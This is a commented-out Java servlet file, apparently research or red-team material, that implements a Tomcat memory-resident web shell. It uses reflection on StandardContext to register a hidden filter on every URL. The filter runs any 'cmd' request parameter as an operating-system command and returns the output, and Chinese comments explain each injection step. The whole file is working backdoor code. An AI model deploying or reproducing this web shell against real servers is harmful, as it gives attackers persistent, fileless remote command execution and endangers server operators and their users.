//package test;
//
//import javax.servlet.http.HttpServlet;
//
//public class InjectMemoryServlet extends HttpServlet {
//    @Override
//    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
//        Field Configs = null;
//        Map filterConfigs;
//        try {
////这里是反射获取ApplicationContext的context，也就是standardContext
//            ServletContext servletContext = req.getSession().getServletContext();
//
//            Field appctx = servletContext.getClass().getDeclaredField("context");
//            appctx.setAccessible(true);
//            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
//
//            Field stdctx = applicationContext.getClass().getDeclaredField("context");
//            stdctx.setAccessible(true);
//            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
//
//            String FilterName = "cmd_Filter";
//            Configs = standardContext.getClass().getDeclaredField("filterConfigs");
//            Configs.setAccessible(true);
//            filterConfigs = (Map) Configs.get(standardContext);
//
//            if (filterConfigs.get(FilterName) == null){
//                Filter filter = new Filter() {
//
//                    @Override
//                    public void init(FilterConfig filterConfig) throws ServletException {
//
//                    }
//
//                    @Override
//                    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
//                        HttpServletRequest req = (HttpServletRequest) servletRequest;
//                        if (req.getParameter("cmd") != null){
//
//                            InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
////
//                            Scanner s = new Scanner(in).useDelimiter("\\A");
//                            String output = s.hasNext() ? s.next() : "";
//                            servletResponse.getWriter().write(output);
//
//                            return;
//                        }
//                        filterChain.doFilter(servletRequest,servletResponse);
//                    }
//
//                    @Override
//                    public void destroy() {
//
//                    }
//                };
////反射获取FilterDef，设置filter名等参数后，调用addFilterDef将FilterDef添加
//                Class<?> FilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
//                Constructor declaredConstructors = FilterDef.getDeclaredConstructor();
//                FilterDef o = (org.apache.tomcat.util.descriptor.web.FilterDef)declaredConstructors.newInstance();
//                o.setFilter(filter);
//                o.setFilterName(FilterName);
//                o.setFilterClass(filter.getClass().getName());
//                standardContext.addFilterDef(o);
////反射获取FilterMap并且设置拦截路径，并调用addFilterMapBefore将FilterMap添加进去
//                Class<?> FilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
//                Constructor<?> declaredConstructor = FilterMap.getDeclaredConstructor();
//                org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();
//
//                o1.addURLPattern("/*");
//                o1.setFilterName(FilterName);
//                o1.setDispatcher(DispatcherType.REQUEST.name());
//                standardContext.addFilterMapBefore(o1);
//
////反射获取ApplicationFilterConfig，构造方法将 FilterDef传入后获取filterConfig后，将设置好的filterConfig添加进去
//                Class<?> ApplicationFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
//                Constructor<?> declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);
//                declaredConstructor1.setAccessible(true);
//                ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);
//                filterConfigs.put(FilterName,filterConfig);
//                resp.getWriter().write("Success");
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//
//    @Override
//    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
//        doGet(req, resp);
//    }
//}
